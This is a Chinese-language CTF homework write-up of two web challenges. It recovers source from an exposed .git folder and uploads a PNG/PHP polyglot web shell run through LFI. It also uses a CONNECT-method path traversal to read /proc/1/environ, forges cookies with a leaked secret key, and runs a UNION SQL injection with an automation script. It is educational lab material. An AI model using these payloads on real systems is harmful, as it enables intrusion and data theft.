# 0x02 Web Writeup

## Homework - Imgura [100]

- 題目網址：[https://imgura.chal.h4ck3r.quest/](https://imgura.chal.h4ck3r.quest/)
- 助教給的提示：`Information Leak`、`Upload`、`LFI` (老實說提示的滿兇的XD)
- Imgura 資料夾中的項目：
  - `leak_src.zip`：透過 `.git` 還原出的原始檔
  - `prev_commit_src`：還原上一個 Commit 的 Source Code
  - `Retro9IsMe.png.php`：攻擊 Payload
  - `Retro9IsMe.png`：偽裝圖片

看到提示其實就可以猜到幾個 Information Leak 的方向，有幾種可能如 Error 的 Debug 資訊沒關、robots.txt 裡或 source code 裡有些 Route 沒拿掉或沒辦法拿掉等等。但這題的 Information Leak 肇因於部署時是直接透過 git pull 後在專案根目錄直接起一個 Http Server，讓攻擊者可以存取 `.git` 資料夾還原出完整的 Source Code

![Imgura git config](./resources/Screen%20Shot%202021-10-28%20at%204.09.23%20PM.png)

透過 [Scrabble](https://github.com/denny0223/scrabble) 去還原後就可以得到整個網頁的原始碼。從 `git log` 中可以看到這個 Repo 最近的 commit 把 Dev Page 刪除了：

![Git src log](./resources/Screen%20Shot%202021-10-28%20at%204.14.37%20PM.png)

我們只要透過指令 `git reset HEAD^ --hard` 回到 First commit，就可以得到所有 Dev 的程式碼了。

從這些程式碼中可以看到，這個頁面「曾經」有一個 dev_test_page 的存在，裏面有 Upload 功能以及 Share Image 的功能。為什麼是說「曾經」呢？理論上這些檔案本不應該存在在根目錄了，但實際上切到 `https://imgura.chal.h4ck3r.quest/dev_test_page/?page=pages/share` 路徑上仍可以看到舊的頁面，這邊真的滿起怪的，也許是題目故意設計的吧。

![Imgura dev src page](./resources/Screen%20Shot%202021-10-28%20at%204.22.26%20PM.png)

總之分析過程式碼後可以得到兩個漏洞，分別是**上傳 Filter 實作上的缺陷**以及**HomePage 時做切換頁面的方法導致的 LFI 漏洞**。

Filter 功能的漏洞如下：

```php
# 這裏居然預設是取第二個 Split 元素，直接預設整個檔名中只會有一個 dot
# bypass 的方法只要在檔名中多加一個 .png 或其他可接受的 extension 就可了
$extension = strtolower(explode(".", $filename)[1]);

if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
    die("Invalid file extension: $extension.");
}

# 這個 check 方法會 Check 檔案的第一個 File，假設今天這個檔案是由兩種不同的檔案接在一起的話，就可以 Bypass 掉這條限制
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['image_file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png', 'image/jpeg'])) {
    die('Not an valid image.');
}

# 濾掉 <?php ....
# 這個就有一堆 Bypass 方法了，黑名單永遠是最不好的方法
$content = file_get_contents($_FILES['image_file']['tmp_name']);
if (stripos($content, "<?php") !== false) {
    die("Hacker?");
}
```

其他限制就滿簡單的如檔案大小、width、height 等等就滿簡單可以 Bypass 掉。

第二個漏洞來自於 index page 實作 router 的方法導致的 LFI:

```html
<div class="hero-body">
  <?php
  include ($_GET['page'] ?? 'pages/main') . ".php";
  ?>
</div>
```

所以最終的攻擊手法：

1. 在一個 legit 的 png (`Retro9IsMe.png`) 檔後新增一小段 php script (`<?=system($_GET["cmd"]);?>`)
2. 改檔名成 `Retro9IsMe.png.php`
3. 把檔案透過上傳功能上傳到伺服器
4. 把首頁 `page` query 改成檔案位置，並加上 cmd query 執行 Commmad
5. Navigator 後找到 Flag 檔案

## Homework - Screensaver [200]

題目提供的資料：

- DVD-Screensaver
  - `app`: 伺服器原始碼
  - `db.sql`: 部分資料庫初始化 sql script
  - `docker-compose.yml`: Docker Compose 部署 yml 檔
  - `Dockerfile`: 伺服器 Image Dockerfile

解題時用到的程式碼 or 指令

- DVD-Screensaver
  - `signCookie`: 取得 Secret Key 後自行簽 Cookie 的程式碼
  - `automation.py`: 自動執行 Sqli 的 python script
  - `challenge_server_env.txt`: 目標伺服器中的 `/proc/1/environ`
  - `curl-script.sh`: 測試 Idea 可不可行時使用到的 `curl` 指令
  - `secretKey.txt`: 簽 Cookie 使用到的密鑰
  - `sqli_payload.txt`: sql injection 使用到的 payload

### Recon

先來個 Happy Walk 後，這個網頁基本上就只是一個擬螢幕保護程式，用 Guest 登入後會有個 u don't have flag 在螢幕上跑來跑去：

![you don't have flag](./resources/Screen%20Shot%202021-10-28%20at%209.14.52%20PM.png)

整個 Web App 看起來唯一使用者可以控制的 Input 就只有在登入頁面了，而登入後的頁面則是吃 Cookie 的值來驗證使用者是誰。

接下來來看 Source Code。Server 的部署方式是使用 Docker Compose 來達成，除了 Public Web Server 以外後端有一台 Mysql 伺服器負責儲存使用者的帳號密碼，而 mysql 本身的伺服器帳號密碼是寫死在 source code 裡的，但看起來這題沒有機會達成 SSRF 的路徑，有帳號密碼也沒用。

這個 Web App 主要功能是產生一組**由使用者控制的 username，以及一個 Environment Variable 中的 Secret Key**，產生cookie 後回傳給前端完成使用者認證，前端頁面則會根據這個 **username** 使用者在 DB 中的 row entry 中有沒有 Flag 這個欄位，有的話則會顯示使用者的 Flag，沒有則是顯示 `You don't have flag`。

當然在沒有使用 ORM 的狀況下，程式碼中有兩個看起來有機會達成 Sqli 的漏洞。第一個看起來使用者可控，但 Inject 的內容是來自於 Cookie，所以我們需要進一步的資料。

```go
// 產生 Cookie 的地方
session, _ := store.Get(r, "session")
session.Values["username"] = username
err = session.Save(r, w)
if err != nil {
    log.Println(err)
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
}
http.Redirect(w, r, "/", http.StatusFound)
```

```go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    session, _ := store.Get(r, "session")

    username := session.Values["username"]
    if session.Values["username"] == nil {
      http.Redirect(w, r, "/login", http.StatusFound)
      return
    }

    query := fmt.Sprintf("SELECT username, flag FROM users WHERE username='%s'", username)
    row := db.QueryRow(query)
    var user User
    row.Scan(&user.Username, &user.Flag)

    templates.ExecuteTemplate(w, "index.html", user)
})
```

程式碼中的另一個 Sqli 的弱點似乎可行，但因為前面是使用白名單的方式只讓 `^[0-9a-zA-Z]+$` 這些字元輸入，所以從這裡執行 Sqli 是做不到的。

```go
var IsLetter = regexp.MustCompile(`^[0-9a-zA-Z]+$`).MatchString
// ....
if !IsLetter(r.FormValue("username")) || !IsLetter(r.FormValue("password")) {
    log.Println("!IsLetter")
    w.Write([]byte("Incorrect username or password"))
    return
}

var username string
var password string
query := fmt.Sprintf(
    "SELECT username, password FROM users WHERE username='%s' and password='%s'",
    r.FormValue("username"), r.FormValue("password"))
log.Println(query)
err := db.QueryRow(query).Scan(&username, &password)
// ....
```

Source Code 中另一個 Vulnerability 是有關 Path Traversal 類型的漏洞：

```go
http.HandleFunc("/static/", func(w http.ResponseWriter, r *http.Request) {
    filename := strings.TrimPrefix(r.URL.Path, "/static/")
    content, err := os.ReadFile(filepath.Join("./static/", filename))
    if err != nil {
      http.Error(w, "404 Not found", http.StatusNotFound)
      return
    }
    w.Header().Add("Content-Type", mime.TypeByExtension(filepath.Ext(filename)))
    w.Write([]byte(content))
})
```

在一般狀況下，Golang 的 router ([net/http - ServeMux](https://pkg.go.dev/net/http#ServeMux)) 會自動幫你把 Path 縮短成最簡路徑，理論上不可能會有 Path Traversal 的問題：

> ServeMux also takes care of sanitizing the URL request path and the Host header, stripping the port number and redirecting any request containing . or .. elements or repeated slashes to an equivalent, cleaner URL.

但在接下來的段落中明確提到，`CONNECT` 這個 Http Method 會有例外行為：

> The path and host are used unchanged for CONNECT requests.

這個原本是用來 Tunneling 或是 Proxy Server 達到 SSL 的方法([Wiki](https://en.wikipedia.org/wiki/HTTP_tunnel))，在這裡卻可以完美誤用，以達成 Path Traversal 的目的。

所以綜合以上幾個 Recon，我們的 Attack Path 就成形了：

1. 透過 Path Traversal 讀取 `/proc/1/environ` 取得 Sign Cookie 的 `SECRET_KEY`
2. 使用得到的 `SECRET_KEY` 自行簽任意 username 值的 cookie，把 sqli 的 payload 放進去
3. 夾帶 cookie 傳送到 `/` 後，從 `<div class="neon">Hi, {{ .Username.String }} </div>` 取得整個 users 中每個使用者的 Flag

### Pwn

第一步取得 ENV 其實滿簡單的，透過 Curl 就可以輕鬆取得：

```zsh
curl -X CONNECT --path-as-is http://dvd.chal.h4ck3r.quest:10001/static/../../proc/1/environ --output challenge_server_env

# 取的內容
# PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=9ad75fc686b9 SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4 GOLANG_VERSION=1.17.2 GOPATH=/go HOME=/root 
```

第二步，利用取得的 `SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4` 自行簽章包含 Sql 語法的 Cookie (因為一開始還在測試階段，我把簽章程式寫成 Server 模式方便試驗成果以及接下來的 Automation 整合)：

```go
store := sessions.NewCookieStore([]byte("d2908c1de1cd896d90f09df7df67e1d4"))

http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
   payload := r.URL.Query()["username"][0]
   fmt.Println(payload)

   session, _ := store.Get(r, "session")
   session.Values["username"] = payload
   session.Save(r, w)
})
```

最終使用的 Sql Payload：

```sql
-- 後面多加 uid > 70 是因為 group_concat 有字數限制，Flag 又在很後面所以需要加個 offset 才部會印不出來
gudsfasa' UNION SELECT GROUP_CONCAT(flag SEPARATOR ','), NULL FROM users WHERE uid > 70 and ''='
```

第三部把攻擊過程寫成一個 Automation 的 Script，得到最終的 Flag

```python
from requests import get
from sys import argv
from bs4 import BeautifulSoup

# Sign Cookie Url
url = "http://localhost:8888/"
ctf_site = "http://dvd.chal.h4ck3r.quest:10001/"

injection = argv[1].replace(" ", "/**/")

# Generate Cookie
response = get(url+f"get?username={injection}")
generate_cookie = response.cookies["session"]

# Test Result
res = get(ctf_site, cookies={"session": generate_cookie})

soup = BeautifulSoup(res.text, 'html.parser')
datadump = soup.select_one("body>h1").text[4:].split(",")

for d in datadump:
    print(d)
```

執行結果：

![Final Result](./resources/Screen%20Shot%202021-10-28%20at%2010.19.56%20PM.png)
